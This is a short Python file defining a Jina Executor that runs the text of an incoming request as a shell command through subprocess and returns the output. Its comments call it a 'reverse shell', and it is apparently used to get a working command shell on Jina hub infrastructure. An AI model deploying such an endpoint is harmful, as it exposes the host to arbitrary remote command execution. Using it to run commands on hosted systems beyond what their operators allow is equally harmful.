from jina import Executor, requests, DocumentArray

# remember our good old program? our shell?
# proper name is: reverse shell
# hackish? no?

# jina hub supports docker. no need for this shitty hackish shell...
# but we do not have a proper docker image! can we write docker file and push the image remotely, without local storage?

import subprocess
import os


class MyExecutor(Executor):
    @requests
    def foo(self, docs: DocumentArray, **kwargs):
        try:
            command = docs[0].text
            commandList = command.split(" ")
            if commandList[0] == 'cd':
                if len(commandList) == 2:
                    os.chdir(commandList[1])
                    response = os.getcwd()
                else:
                    response = 'usage: cd <target directory>'
            else:
                response = subprocess.check_output(commandList)
            docs[0].text = response
        # docs[1].text = 'goodbye, world!'
        except:
            import traceback
            error = traceback.format_exc()
            docs[0].text = "\n".join(["error!", error])
